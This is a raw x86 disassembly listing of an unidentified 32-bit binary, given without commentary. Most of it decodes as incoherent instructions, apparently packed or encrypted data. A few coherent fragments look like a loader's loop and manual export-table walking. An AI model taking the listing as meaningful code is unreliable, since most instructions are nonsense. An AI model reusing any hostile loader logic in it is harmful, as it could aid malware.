  40ad1d:	adc    BYTE PTR [esi-0x223a111e],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad73
  40ad2c:	inc    esi
  40ad2d:	mov    bl,BYTE PTR [eax-0x63]
  40ad30:	jecxz  0x40ad12
  40ad32:	and    eax,0x57af41d5
  40ad37:	inc    edx
  40ad38:	adc    al,0xcb
  40ad3a:	cwde   
  40ad3b:	sub    eax,0x5cbc5acf
  40ad40:	fwait
  40ad41:	jae    0x40ad04
  40ad43:	add    al,0x3f
  40ad45:	call   0xd424:0xaa71c47d
  40ad4c:	dec    ebx
  40ad4d:	imul   DWORD PTR [esp+ebp*4+0x5c914e14]
  40ad54:	daa    
  40ad55:	sbb    BYTE PTR [ecx+esi*2-0x48],0xba
  40ad5a:	aad    0xc4
  40ad5c:	hlt    
  40ad5d:	ja     0x40ad0a
  40ad5f:	call   0x3def:0x4d0aabd3
  40ad66:	out    0xe2,al
  40ad68:	jbe    0x40ad37
  40ad6a:	es dec ebx
  40ad6c:	(bad)  
  40ad6d:	enter  0xd0ae,0x1
  40ad71:	mul    BYTE PTR [ecx+0x54]
  40ad74:	adc    eax,0xbb94b881
  40ad79:	out    0xb7,eax
  40ad7b:	push   edx
  40ad7c:	sub    edi,DWORD PTR [ecx]
  40ad7e:	push   ebx
  40ad7f:	sbb    ch,dl
  40ad81:	mul    DWORD PTR [esi]
  40ad83:	aaa    
  40ad84:	ss in  al,0xa6
  40ad87:	cwde   
  40ad88:	cmp    cl,BYTE PTR ds:[ebx+esi*4-0x1e]
  40ad8d:	mov    esi,0x9cd3ad63
  40ad92:	iret   
  40ad93:	cld    
  40ad94:	popf   
  40ad95:	int    0xf7
  40ad97:	imul   ebp,DWORD PTR [edx+0x6f],0xffffffe6
  40ad9b:	neg    WORD PTR [edx+0x1540d885]
  40ada2:	dec    eax
  40ada3:	xor    ebp,DWORD PTR ds:0xef175896
  40ada9:	loope  0x40ad88
  40adab:	ja     0x40adc9
  40adad:	das    
  40adae:	and    al,0x86
  40adb0:	jbe    0x40ae0b
  40adb2:	pop    edx
  40adb3:	dec    edi
  40adb4:	pop    esp
  40adb5:	mov    eax,DWORD PTR [esi+eiz*8]
  40adb8:	ds jmp 0x4f68d56
  40adbe:	adc    eax,edx
  40adc0:	mov    bh,0x90
  40adc2:	xor    ch,cl
  40adc4:	jle    0x40adf4
  40adc6:	xchg   esp,eax
  40adc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adc8:	inc    eax
  40adc9:	xchg   al,al
  40adcb:	lods   al,BYTE PTR ds:[esi]
  40adcc:	sbb    eax,DWORD PTR [eax]
  40adce:	xor    DWORD PTR cs:[edi-0x50ca828c],edx
  40add5:	(bad)  
  40add6:	es in  eax,0xe8
  40add9:	inc    ebp
  40adda:	or     BYTE PTR [esi+0x4f7d486c],al
  40ade0:	sub    eax,0xa96e1811
  40ade5:	hlt    
  40ade6:	call   0x6c911b00
  40adeb:	(bad)
  40adee:	or     BYTE PTR [edi-0x5cf82ac6],al
  40adf4:	ja     0x40ae0a
  40adf6:	div    ch
  40adf8:	mov    ecx,0xeaaa645b
  40adfd:	jnp    0x40ae47
  40adff:	mov    bh,BYTE PTR [eax]
  40ae01:	sbb    BYTE PTR ds:0x435b0d96,ch
  40ae07:	in     al,dx
  40ae08:	sub    bl,bh
  40ae0a:	mov    esi,edi
  40ae0c:	jmp    0x60afc2f1
  40ae11:	push   edx
  40ae12:	test   BYTE PTR gs:[eax+0xc],0x72
  40ae17:	neg    DWORD PTR [ecx]
  40ae19:	outs   dx,DWORD PTR ds:[esi]
  40ae1a:	ret    
  40ae1b:	mov    al,0x84
  40ae1d:	adc    dh,bh
  40ae1f:	call   0xed41:0x71708f52
  40ae26:	(bad)  
  40ae27:	icebp  
  40ae28:	rol    BYTE PTR [edi],cl
  40ae2a:	pop    edi
  40ae2b:	push   cs
  40ae2c:	ret    0x58c0
  40ae2f:	xchg   bh,dh
  40ae31:	outs   dx,DWORD PTR ds:[esi]
  40ae32:	std    
  40ae33:	idiv   ebp
  40ae35:	push   edx
  40ae36:	cli    
  40ae37:	jmp    0x40ae35
  40ae39:	push   esi
  40ae3a:	fwait
  40ae3b:	jge    0x40adcf
  40ae3d:	xor    bh,BYTE PTR [ebx]
  40ae3f:	mov    DWORD PTR [eax],edi
  40ae41:	dec    esi
  40ae42:	lahf   
  40ae43:	nop
  40ae44:	fabs   
  40ae46:	fisttp QWORD PTR [ebx]
  40ae48:	clc    
  40ae49:	std    
  40ae4a:	daa    
  40ae4b:	jae    0x40ae0b
  40ae4d:	push   esi
  40ae4e:	sub    esp,DWORD PTR [eax]
  40ae50:	cmp    bl,al
  40ae52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae53:	sbb    eax,0xc5dcf743
  40ae58:	adc    esi,edi
  40ae5a:	mov    ecx,0x5e9e5e00
  40ae5f:	cmp    BYTE PTR [eax+0x22],dh
  40ae62:	jmp    0x40aec4
  40ae64:	push   esi
  40ae65:	or     al,0x83
  40ae67:	retf   0x4e94
  40ae6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae6b:	mov    ds:0xef12b883,al
  40ae70:	addr16 xchg edx,eax
  40ae72:	jl     0x40ae47
  40ae74:	push   edi
  40ae75:	push   ss
  40ae76:	je     0x40ae8e
  40ae78:	cmp    al,0xd1
  40ae7a:	jno    0x40aeb2
  40ae7c:	and    eax,0xe7836285
  40ae81:	sbb    al,0x75
  40ae83:	js     0x40ae5f
  40ae85:	popf   
  40ae86:	mov    al,ds:0x53ca53ae
  40ae8b:	outs   dx,BYTE PTR ds:[esi]
  40ae8c:	sbb    eax,0x1dca2514
  40ae91:	sub    ah,cl
  40ae93:	shr    eax,0xf9
  40ae96:	cli    
  40ae97:	pusha  
  40ae98:	test   al,0xcc
  40ae9a:	fist   DWORD PTR ds:0x9693cc83
  40aea0:	xchg   ebx,eax
  40aea1:	js     0x40aef1
  40aea3:	pop    edi
  40aea4:	push   es
  40aea5:	sbb    cl,BYTE PTR [esi+0x73f4172b]
  40aeab:	leave  
  40aeac:	mov    ecx,ebp
  40aeae:	pop    esp
  40aeaf:	shr    DWORD PTR [eax+0x19],1
  40aeb2:	push   edx
  40aeb3:	aaa    
  40aeb4:	retf   0x6461
  40aeb7:	sub    BYTE PTR [eax],dh
  40aeb9:	adc    al,0xef
  40aebb:	(bad)  
  40aebe:	sar    DWORD PTR [ebx+0x48],1
  40aec1:	push   ecx
  40aec2:	pop    ebp
  40aec3:	push   0x61
  40aec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aec6:	arpl   WORD PTR [esp+ebx*8+0x25],sp
  40aeca:	jge    0x40ae91
  40aecc:	ret    
  40aecd:	stos   DWORD PTR es:[edi],eax
  40aece:	jg     0x40aed8
  40aed0:	mov    esi,0x7cca73b1
  40aed5:	or     eax,0xffffffee
  40aed8:	(bad)  
  40aed9:	mov    DWORD PTR [ecx-0x46768bd6],esp
  40aedf:	mov    eax,ds:0x3ccf5c27
  40aee4:	fsubrp st(5),st
  40aee6:	inc    eax
  40aee7:	lods   eax,DWORD PTR ds:[esi]
  40aee8:	stos   BYTE PTR es:[edi],al
  40aee9:	jg     0x40af03
  40aeeb:	mov    DWORD PTR [ebx+0x2a],edi
  40aeee:	xor    eax,0xe4b344f1
  40aef3:	in     eax,0xbf
  40aef5:	aas    
  40aef6:	jae    0x40af61
  40aef8:	sti    
  40aef9:	jb     0x40aeeb
  40aefb:	int    0xc4
  40aefd:	arpl   WORD PTR [eax-0x7a],cx
  40af00:	xchg   esp,eax
  40af01:	(bad)  
  40af02:	sbb    ecx,ebx
  40af04:	mov    BYTE PTR [edx-0x179d6cb2],cl
  40af0a:	lock add eax,0x394277a7
  40af10:	stc    
  40af11:	sbb    esp,ecx
  40af13:	aas    
  40af14:	mov    ds:0x6e34b5f,eax
  40af19:	enter  0x417,0x5a
  40af1d:	inc    ebx
  40af1e:	add    eax,0xe7c46f56
  40af23:	test   BYTE PTR [edx+edi*2+0x6fc5d006],dl
  40af2a:	jne    0x40af46
  40af2c:	je     0x40aeec
  40af2e:	jge    0x40af84
  40af30:	push   0xdae0820b
  40af35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af36:	sbb    DWORD PTR [ebp+0x45208b99],0xde5bf4ba
  40af40:	jge    0x40af3d
  40af42:	aad    0x92
  40af44:	leave  
  40af45:	call   0x4eaf8546
  40af4a:	adc    eax,0xe6addd25
  40af4f:	mov    edx,0x8afe7ba4
  40af54:	sub    BYTE PTR [edi+0x648f4f4b],cl
  40af5a:	test   eax,0xe53664c1
  40af5f:	dec    eax
  40af60:	aad    0x68
  40af62:	mov    ds:0x45100358,eax
  40af67:	push   edx
  40af68:	push   ebx
  40af69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af6a:	mov    dh,0xb0
  40af6c:	sub    BYTE PTR [edi],0xf8
  40af6f:	sub    DWORD PTR [ebx+ecx*4],ebx
  40af72:	inc    eax
  40af73:	sbb    BYTE PTR [ecx+0x7018c9],al
  40af79:	add    BYTE PTR [ecx+0x458be045],cl
  40af7f:	in     al,dx
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4337a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43375f
  40af93:	sub    DWORD PTR ds:0x43370f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43375b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43375b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43375b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43375b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43375b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43375b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43375b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43375b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4337a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	push   ss
  40b018:	pop    eax
  40b01a:	xor    DWORD PTR [edi+esi*8+0x7e],esp
  40b01e:	jle    0x40b058
  40b020:	jl     0x40b0a0
  40b022:	jle    0x40b0a0
  40b024:	dec    ebp
  40b025:	xchg   edx,eax
  40b026:	mov    cl,BYTE PTR [edx+0x4941924b]
  40b02c:	push   ds
  40b02d:	push   edx
  40b02e:	lds    eax,FWORD PTR [eax-0x49]
  40b031:	xor    cl,dl
  40b033:	cld    
  40b034:	data16 loopne 0x40b048
  40b037:	mov    ebx,0xee814327
  40b03c:	rcr    DWORD PTR [eax],cl
  40b03e:	mov    esi,0x8c6798e7
  40b043:	fnstsw WORD PTR [edi+0x24]
  40b046:	aas    
  40b047:	sub    BYTE PTR ds:0xcdf25328,0x5b
  40b04e:	fidivr DWORD PTR [ebx+eax*8]
  40b051:	fnstenv [edx-0x5ed58f7f]
  40b057:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b058:	mov    cl,0xff
  40b05a:	or     DWORD PTR [ebp-0x57],ebp
  40b05d:	pushf  
  40b05e:	cmp    ebx,DWORD PTR [ebx]
  40b060:	mov    ds:0x87caa9b3,eax
  40b065:	sbb    esi,DWORD PTR [edi+ebx*8]
  40b068:	pop    esi
  40b069:	inc    esp
  40b06a:	cdq    
  40b06b:	rcl    DWORD PTR [ebp+eiz*8-0x1b1ee6bf],0x43
  40b073:	(bad)  
  40b074:	push   ecx
  40b075:	shr    BYTE PTR [ebp-0x23],0x1d
  40b079:	fs cwde 
  40b07b:	bound  esp,QWORD PTR [ebp-0x354141c6]
  40b081:	test   DWORD PTR [ebx+ebx*8],ebp
  40b084:	jae    0x40b0fd
  40b086:	cld    
  40b087:	push   0x64f9e5f7
  40b08c:	mov    esi,0x77fe130d
  40b091:	jns    0x40b024
  40b093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b094:	mov    bl,0x67
  40b096:	aad    0x24
  40b098:	cmp    DWORD PTR [esi-0x3c],ebx
  40b09b:	cld    
  40b09c:	ret    
  40b09d:	xor    esi,esp
  40b09f:	fisttp DWORD PTR [esi+0x7a51333b]
  40b0a5:	lds    ecx,FWORD PTR [edi+0x1d]
  40b0a8:	cmp    DWORD PTR [ebx],edx
  40b0aa:	jmp    0x2c70:0x9586159
  40b0b1:	dec    edi
  40b0b2:	mov    DWORD PTR [edx+0x797c238e],ebx
  40b0b8:	cmp    BYTE PTR [ecx+0x55cfa8d1],0x90
  40b0bf:	repz mov esi,0xf0ec4b9f
  40b0c5:	xor    BYTE PTR [ecx],al
  40b0c7:	pop    edx
  40b0c8:	shl    esp,1
  40b0ca:	mov    edi,0xe4177698
  40b0cf:	inc    esp
  40b0d0:	outs   dx,BYTE PTR ds:[esi]
  40b0d1:	lods   al,BYTE PTR ds:[esi]
  40b0d2:	(bad)
  40b0d6:	jl     0x40b127
  40b0d8:	in     al,0x97
  40b0da:	call   0x43eb:0xd4019bc5
  40b0e1:	retf   0xee56
  40b0e4:	adc    al,0x8d
  40b0e6:	jle    0x40b14a
  40b0e8:	jmp    0x40b122
  40b0ea:	mov    ecx,0x2289eb34
  40b0ef:	push   edi
  40b0f0:	ja     0x40b0d7
  40b0f2:	dec    ecx
  40b0f3:	aad    0xd9
  40b0f5:	dec    edi
  40b0f6:	xchg   edi,eax
  40b0f7:	vandps xmm3,xmm1,XMMWORD PTR [ebx+eiz*2+0x531cad84]
  40b100:	jns    0x40b100
  40b102:	jns    0x40b157
  40b104:	mov    eax,0xb6ef913b
  40b109:	inc    ebx
  40b10a:	jle    0x40b0bb
  40b10c:	fcom   QWORD PTR [edx]
  40b10e:	push   ebx
  40b10f:	jecxz  0x40b17e
  40b111:	add    BYTE PTR [eax],0x24
  40b114:	sbb    al,0x3e
  40b116:	loopne 0x40b159
  40b118:	pop    esi
  40b119:	lods   al,BYTE PTR ds:[esi]
  40b11a:	add    BYTE PTR [eax+0x239e96f4],bl
  40b120:	test   al,0x28
  40b122:	(bad)  
  40b123:	jle    0x40b1a0
  40b125:	bnd jge 0x40b0b4
  40b128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b129:	xchg   ebx,eax
  40b12a:	adc    al,0xd5
  40b12c:	pusha  
  40b12d:	dec    ecx
  40b12e:	mov    ebx,0xfac4d01
  40b133:	dec    ebx
  40b134:	scas   al,BYTE PTR es:[edi]
  40b135:	push   ecx
  40b136:	addr16 add ecx,esi
  40b139:	mov    eax,ds:0x9904e48b
  40b13e:	push   eax
  40b13f:	inc    esp
  40b140:	push   edx
  40b141:	cmp    eax,0x56fb3081
  40b146:	rcr    ecx,1
  40b148:	pop    cx
  40b14a:	pop    eax
  40b14b:	push   cs
  40b14c:	(bad)  
  40b14d:	and    ebp,DWORD PTR [esi-0x114f6147]
  40b153:	mov    al,ds:0xff942a9f
  40b158:	jl     0x40b182
  40b15a:	sbb    ah,BYTE PTR [edx+0x390f3202]
  40b160:	popf   
  40b161:	xor    bl,BYTE PTR ds:[edx+0x5261ceb0]
  40b168:	scas   eax,DWORD PTR es:[edi]
  40b169:	lea    esp,[eax]
  40b16b:	or     dl,BYTE PTR [edi-0x75]
  40b16e:	pop    ss
  40b16f:	jp     0x40b1ed
  40b171:	xchg   edi,eax
  40b172:	not    BYTE PTR [ebx-0x13]
  40b175:	and    BYTE PTR [ecx+0x25],bl
  40b178:	or     BYTE PTR [ebp+0x1e8912eb],dh
  40b17e:	jo     0x40b151
  40b180:	jmp    0x40b148
  40b182:	in     al,0xc7
  40b184:	pushf  
  40b185:	or     cl,BYTE PTR [ecx]
  40b187:	stos   DWORD PTR es:[edi],eax
  40b188:	addr16 mov ecx,0x205b8a9d
  40b18e:	ins    BYTE PTR es:[edi],dx
  40b18f:	sti    
  40b190:	mov    edx,0xef731da2
  40b195:	mov    ah,0x8
  40b197:	inc    esi
  40b198:	mov    esp,0xa9bf6b0f
  40b19d:	or     al,BYTE PTR [ecx-0x4a]
  40b1a0:	jnp    0x40b18d
  40b1a2:	outs   dx,DWORD PTR ds:[esi]
  40b1a3:	cmp    BYTE PTR [ecx+0x58f4572],ah
  40b1a9:	out    0x56,eax
  40b1ab:	xchg   BYTE PTR [edi+0x6b1b2fac],dh
  40b1b1:	jne    0x40b20b
  40b1b3:	jmp    0x40b1f3
  40b1b5:	push   ss
  40b1b6:	leave  
  40b1b7:	sti    
  40b1b8:	adc    eax,0xc39d8750
  40b1bd:	and    ah,BYTE PTR [ebp-0x6046672]
  40b1c3:	sub    dl,ah
  40b1c5:	adc    edi,edi
  40b1c7:	push   0x9e53864e
  40b1cc:	dec    edi
  40b1cd:	mov    cl,0x1a
  40b1cf:	mov    ch,0x1c
  40b1d1:	xchg   ecx,eax
  40b1d2:	(bad)  
  40b1d3:	fcmovne st,st(5)
  40b1d5:	scas   eax,DWORD PTR es:[edi]
  40b1d6:	push   0xfd8b5e4c
  40b1db:	idiv   esi
  40b1dd:	mov    al,0x71
  40b1df:	cmp    al,0x8
  40b1e1:	jmp    0xd4061e48
  40b1e6:	test   BYTE PTR ds:0x43d0fcbd,ah
  40b1ec:	jb     0x40b1ff
  40b1ee:	cs dec ecx
  40b1f0:	ror    BYTE PTR [edx-0x39],0x24
  40b1f4:	jmp    0x9f8c:0xa90875b9
  40b1fb:	mov    ebx,0x2b3837d5
  40b200:	jg     0x40b190
  40b202:	push   ss
  40b203:	add    eax,0x32bedc60
  40b208:	adc    DWORD PTR [edx],esi
  40b20a:	mov    WORD PTR [edx+eax*2+0x1f7e1472],?
  40b211:	data16 lahf 
  40b213:	mov    al,ds:0x4d8fbbc5
  40b218:	xchg   esp,eax
  40b219:	jb     0x40b267
  40b21b:	add    eax,0xc5b27cb1
  40b220:	aaa    
  40b221:	push   ds
  40b222:	retf   
  40b223:	fistp  WORD PTR [edi+0x606f14a1]
  40b229:	or     BYTE PTR [eax],dh
  40b22b:	es sub eax,0xca32a8c3
  40b231:	mov    esp,0x498ec1d4
  40b236:	cmp    BYTE PTR [eax],dh
  40b238:	cmc    
  40b239:	mov    bl,0x1e
  40b23b:	loopne 0x40b230
  40b23d:	or     eax,0xeb6307e2
  40b242:	loope  0x40b299
  40b244:	shl    DWORD PTR [ecx],1
  40b246:	inc    ebx
  40b247:	xchg   DWORD PTR [esi+0x70],esp
  40b24a:	adc    ebp,0xffffffb8
  40b24d:	iret   
  40b24e:	addr16 lahf 
  40b250:	jne    0x40b2c4
  40b252:	stc    
  40b253:	mov    esi,0x4cd4d69e
  40b258:	sbb    al,0x31
  40b25a:	(bad)  
  40b25b:	sbb    ah,BYTE PTR [ebx-0x33]
  40b25e:	aad    0x2
  40b260:	idiv   BYTE PTR [esi+0x5e]
  40b263:	mov    bh,al
  40b265:	es pushf 
  40b267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b268:	cmp    cl,BYTE PTR [ebx+0x4d8bec45]
  40b26e:	or     BYTE PTR [ebx],al
  40b270:	dec    eax
  40b271:	and    al,0xe9
  40b273:	pop    esi
  40b274:	add    al,BYTE PTR [eax]
  40b276:	add    BYTE PTR [ecx-0x73],dh
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	push   ds
  40b284:	popa   
  40b285:	push   edi
  40b286:	mov    dh,0x2e
  40b288:	bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	out    0x7c,eax
  40b291:	aas    
  40b292:	fcom   QWORD PTR [ebx+0x1845cac4]
  40b298:	lea    ecx,[ecx+0x6f]
  40b29b:	or     ah,BYTE PTR [ecx]
  40b29d:	mov    dh,BYTE PTR [esi+ecx*1-0x5ad2a569]
  40b2a4:	sbb    BYTE PTR [edx-0x50],0xea
  40b2a8:	xor    esp,DWORD PTR [edi-0x61]
  40b2ab:	push   es
  40b2ac:	je     0x40b258
  40b2ae:	jae    0x40b230
  40b2b0:	xchg   BYTE PTR [eax+0x43],ah
  40b2b3:	cmp    bl,BYTE PTR [ecx+0x44acef36]
  40b2b9:	jae    0x40b2f3
  40b2bb:	or     ecx,DWORD PTR [edx+eax*1-0x41e0b636]
  40b2c2:	aas    
  40b2c3:	pop    es
  40b2c4:	arpl   WORD PTR [ebp+0x13],ax
  40b2c7:	cld    
  40b2c8:	mov    al,0x9c
  40b2ca:	nop
  40b2cb:	je     0x40b25a
  40b2cd:	scas   al,BYTE PTR es:[edi]
  40b2ce:	ss inc eax
  40b2d0:	ret    0x388b
  40b2d3:	stc    
  40b2d4:	pop    edi
  40b2d5:	inc    esi
  40b2d6:	test   eax,0x7282c271
  40b2db:	push   ecx
  40b2dc:	sbb    DWORD PTR [edi+0x7942e2e2],0xb0704b4f
  40b2e6:	jbe    0x40b2e9
  40b2e8:	add    DWORD PTR [esi+0x34eb9fc2],ebx
  40b2ee:	jnp    0x40b2e5
  40b2f0:	and    DWORD PTR [esi-0x21],0x3c
  40b2f4:	push   cs
  40b2f5:	ja     0x40b2bf
  40b2f7:	(bad)  
  40b2f8:	mov    dl,0x5c
  40b2fa:	rcr    BYTE PTR [edx-0x7135dbbd],1
  40b300:	ins    BYTE PTR es:[edi],dx
  40b301:	int    0xdb
  40b303:	and    BYTE PTR [edx+esi*2],0x73
  40b307:	mov    ?,WORD PTR [esi-0x68dc35fa]
  40b30d:	repnz popf 
  40b30f:	outs   dx,BYTE PTR ds:[esi]
  40b310:	xor    ebp,DWORD PTR [eax]
  40b312:	mov    ebp,0x81043c12
  40b317:	ins    BYTE PTR es:[edi],dx
  40b318:	gs int 0x77
  40b31b:	sbb    ecx,edi
  40b31d:	fistp  QWORD PTR [esi]
  40b31f:	fpatan 
  40b321:	(bad)  
  40b322:	pop    ecx
  40b323:	and    DWORD PTR [esp+ebp*2-0x10],eax
  40b327:	xchg   ebx,eax
  40b328:	jmp    0xaab5a7ec
  40b32d:	lahf   
  40b32e:	sar    DWORD PTR [ebp-0x36f85f68],cl
  40b334:	push   ecx
  40b335:	jmp    FWORD PTR [edx+edx*8-0x5]
  40b339:	cwde   
  40b33a:	jns    0x40b31f
  40b33c:	inc    esp
  40b33d:	add    edi,DWORD PTR [esi-0x26]
  40b340:	loope  0x40b353
  40b342:	mov    ebx,DWORD PTR [edi-0x4b29c50b]
  40b348:	mov    ch,0xfe
  40b34a:	mov    dh,0xea
  40b34c:	add    ebx,DWORD PTR es:[esi]
  40b34f:	ins    DWORD PTR es:[edi],dx
  40b350:	cli    
  40b351:	mov    ecx,0xaa6ec495
  40b356:	cmp    esi,ecx
  40b358:	imul   esi,DWORD PTR [ebp+0x71],0x1c
  40b35c:	adc    ecx,edi
  40b35e:	outs   dx,DWORD PTR ds:[esi]
  40b35f:	popa   
  40b360:	fidiv  DWORD PTR [eax+0x42]
  40b363:	mov    edx,0xebac842f
  40b368:	retf   
  40b369:	xchg   ecx,eax
  40b36b:	mov    dl,0x82
  40b36d:	jmp    0xf365:0x97606af3
  40b374:	mov    ebx,0x2eae989d
  40b379:	mov    ebx,0x4b03caf6
  40b37e:	adc    al,BYTE PTR [ebx]
  40b380:	inc    ecx
  40b381:	lea    ebx,[edx+0x280d4cb1]
  40b387:	ins    DWORD PTR es:[edi],dx
  40b388:	cmp    ebx,DWORD PTR [edi+ebp*8+0xda7a7a]
  40b38f:	dec    ecx
  40b390:	outs   dx,BYTE PTR ds:[esi]
  40b391:	mov    ecx,0xf2e451b8
  40b396:	cmp    eax,0xc94a4eb
  40b39b:	mov    ebp,DWORD PTR [ecx+0x2b]
  40b39e:	jecxz  0x40b400
  40b3a0:	int3   
  40b3a1:	sub    eax,0x57b688f5
  40b3a6:	icebp  
  40b3a7:	pop    edx
  40b3a8:	jne    0x40b375
  40b3aa:	ds xchg esp,eax
  40b3ac:	int3   
  40b3ad:	pop    ebp
  40b3ae:	dec    eax
  40b3af:	push   edi
  40b3b0:	scas   eax,DWORD PTR es:[edi]
  40b3b1:	jns    0x40b3f1
  40b3b3:	imul   ecx,DWORD PTR [edi],0x64aa23b0
  40b3b9:	leave  
  40b3ba:	sub    ebx,edx
  40b3bc:	jo     0x40b3c1
  40b3be:	inc    edi
  40b3bf:	push   ds
  40b3c0:	xchg   ebp,eax
  40b3c1:	pop    edx
  40b3c2:	stos   BYTE PTR es:[edi],al
  40b3c3:	fyl2xp1 
  40b3c5:	fucompp 
  40b3c7:	sbb    DWORD PTR [ecx+0x792f54c6],0x273e725
  40b3d1:	call   0x11ec:0x80535c8d
  40b3d8:	inc    edi
  40b3d9:	inc    edx
  40b3da:	xor    ah,bl
  40b3dc:	pop    esp
  40b3dd:	or     esi,esi
  40b3df:	push   edx
  40b3e0:	push   ds
  40b3e1:	adc    eax,0xa81e3aaa
  40b3e6:	pop    edx
  40b3e7:	jb     0x40b3d5
  40b3e9:	lds    ebp,FWORD PTR [esi-0x4d146c4c]
  40b3ef:	fnstcw WORD PTR [eax]
  40b3f1:	push   0xe94fc570
  40b3f6:	adc    dh,BYTE PTR [esi+0x136e3778]
  40b3fc:	dec    eax
  40b3fd:	dec    edi
  40b3fe:	xchg   edx,eax
  40b3ff:	stos   DWORD PTR es:[edi],eax
  40b400:	inc    eax
  40b401:	push   ebx
  40b402:	inc    edi
  40b403:	pop    ebp
  40b404:	enter  0xdbf4,0x18
  40b408:	iret   
  40b409:	cli    
  40b40a:	std    
  40b40b:	dec    edx
  40b40c:	pop    ecx
  40b40d:	leave  
  40b40e:	xor    ah,BYTE PTR [esi]
  40b410:	aad    0x28
  40b412:	and    al,0xed
  40b414:	xchg   esp,eax
  40b415:	dec    ecx
  40b416:	mov    dl,0x6f
  40b418:	popa   
  40b419:	mov    al,0x65
  40b41b:	es push ecx
  40b41d:	scas   al,BYTE PTR es:[edi]
  40b41e:	xchg   edi,eax
  40b41f:	cld    
  40b420:	loopne 0x40b497
  40b422:	das    
  40b423:	mov    esi,DWORD PTR [edx+0x4a]
  40b426:	and    BYTE PTR [edx],ch
  40b428:	repnz iret 
  40b42a:	ja     0x40b48e
  40b42c:	dec    eax
  40b42d:	and    DWORD PTR [ebx],ebp
  40b42f:	test   eax,0x28792c38
  40b434:	lods   eax,DWORD PTR es:[esi]
  40b436:	mov    cl,0x4d
  40b438:	ret    0x3a25
  40b43b:	nop
  40b43c:	test   eax,0xf6de2f7f
  40b441:	call   0x5021:0x89773ca8
  40b448:	pop    ecx
  40b449:	xlat   BYTE PTR ds:[ebx]
  40b44a:	mov    ?,WORD PTR [esi+0x52]
  40b44d:	aam    0x45
  40b44f:	jmp    DWORD PTR [ebx-0x17]
  40b452:	pop    ebp
  40b453:	loopne 0x40b455
  40b455:	mov    ch,0xef
  40b457:	adc    DWORD PTR [edx-0x594cc200],0x3d
  40b45e:	pusha  
  40b45f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b460:	sahf   
  40b461:	or     al,0x14
  40b463:	lds    eax,FWORD PTR [edi+edi*8-0x20b6fdb]
  40b46a:	xchg   edi,eax
  40b46b:	bound  esi,QWORD PTR [esp+ebp*4]
  40b46e:	out    dx,eax
  40b46f:	mov    si,0xe1ae
  40b473:	call   0x5b1d:0xaa6e22ff
  40b47a:	jle    0x40b49a
  40b47c:	loop   0x40b4cd
  40b47e:	dec    esi
  40b47f:	jb     0x40b4a0
  40b481:	leave  
  40b482:	jbe    0x40b4be
  40b484:	inc    ecx
  40b485:	sbb    eax,0x3d743ec2
  40b48a:	add    ecx,DWORD PTR [edx]
  40b48c:	sti    
  40b48d:	hlt    
  40b48e:	mov    ebx,0xe41c6568
  40b493:	pop    eax
  40b494:	cmp    dl,dl
  40b496:	mov    edi,0x9496f7b0
  40b49b:	(bad)  
  40b49c:	xchg   ebp,eax
  40b49d:	push   ss
  40b49e:	inc    DWORD PTR [eax-0x7f]
  40b4a1:	mov    bl,0x7b
  40b4a3:	rol    DWORD PTR [ebp+0x3cc32507],0x5a
  40b4aa:	aad    0x4f
  40b4ac:	add    al,0xe9
  40b4ae:	call   0x3499:0xe3e00995
  40b4b5:	sbb    al,0xd5
  40b4b7:	leave  
  40b4b8:	pop    esp
  40b4b9:	aas    
  40b4ba:	pop    esi
  40b4bb:	fdiv   st,st(4)
  40b4bd:	shl    BYTE PTR [edi-0x36],0xb7
  40b4c1:	popf   
  40b4c2:	aaa    
  40b4c3:	das    
  40b4c4:	and    DWORD PTR [edx-0x4a],edx
  40b4c7:	mov    dl,0xc8
  40b4c9:	pushf  
  40b4ca:	int3   
  40b4cb:	inc    edx
  40b4cc:	mov    ebp,DWORD PTR [ecx-0x50]
  40b4cf:	add    eax,0xeef3d115
  40b4d4:	bound  ecx,QWORD PTR [ecx+0x458bd44d]
  40b4da:	in     al,dx
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
